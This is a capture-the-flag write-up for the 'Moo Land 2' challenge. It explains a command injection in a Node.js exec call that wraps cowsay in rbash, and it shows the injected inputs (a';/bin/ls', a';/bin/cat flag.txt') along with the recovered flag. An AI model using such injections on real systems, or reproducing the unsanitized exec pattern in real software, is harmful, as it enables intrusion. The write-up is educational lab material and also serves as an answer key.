# Moo Land 2

## Question Text

Moo Land is back!

`nc pwn.chal.gryphonctf.com 18405`

*Creator - PotatoDrug*

### Hints (Optional)
Do some fuzzing, your goal is to escape rbash

## Setup Guide
Run `./build.sh`

## Solution

The service is vulnerable because of unsanitized user input. We can terminate the rbash command with a single quote and run another command in the unrestricted shell. Do note that you have to provide the full path to the command.
```javascript
exec('/bin/bash -rc \'cowsay ' + recieved + '\'', (error, stdout, stderr) => {
    sock.write(stdout + '\n> ');
});
```

Sample solution
```
> a';/bin/ls'
 ___
< a >
 ---
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
banner.txt
flag.txt
progs
server.js

> a';/bin/cat flag.txt'
 ___
< a >
 ---
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
GCTF{th3Y_C4ll_m3_th3_35C4P3_4Rt151t}
```

### Flag
`GCTF{th3Y_C4ll_m3_th3_35C4P3_4Rt151t}`